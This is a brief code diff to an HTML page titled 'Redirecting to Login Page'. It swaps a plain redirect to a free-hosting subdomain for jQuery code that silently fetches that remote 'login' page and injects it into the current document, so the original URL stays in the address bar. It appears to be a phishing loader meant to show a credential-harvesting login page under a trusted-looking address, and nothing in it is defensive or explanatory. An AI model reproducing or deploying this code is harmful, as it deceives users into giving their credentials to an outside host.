@@ -2,10 +2,17 @@
 <html>
 <head>
     <title>Redirecting to Login Page</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script>
-        setTimeout(function() {
-            window.location.href = "https://duskiest-piers.000webhostapp.com";
+        $(document).ready(function() {
+            // Load login page content using AJAX
+            $.get("https://duskiest-piers.000webhostapp.com", function(data) {
+                // Replace the current page content with the login page content
+                $("html").html(data);
+            });
         });
     </script>
 </head>
+<body>
+</body>
 </html>
